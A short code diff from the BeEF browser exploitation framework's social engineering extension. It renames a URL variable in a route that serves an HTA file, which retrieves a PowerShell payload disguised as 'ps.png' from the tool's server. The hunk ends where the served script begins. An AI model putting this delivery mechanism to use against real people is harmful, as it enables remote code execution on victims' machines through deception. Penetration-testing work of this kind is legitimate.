@@ -29,9 +29,9 @@ module BeEF
         get '/hta' do
           response['Content-Type'] = "application/hta"
           @config = BeEF::Core::Configuration.instance
-          hook_url = @config.hook_url
+          beef_url_str = @config.beef_url_str
           ps_url = @config.get('beef.extension.social_engineering.powershell.powershell_handler_url')
-          payload_url = "#{hook_url}#{ps_url}/ps.png"
+          payload_url = "#{beef_url_str}#{ps_url}/ps.png"
 
           print_info "Serving HTA. Powershell payload will be retrieved from: #{payload_url}"
           "<script>
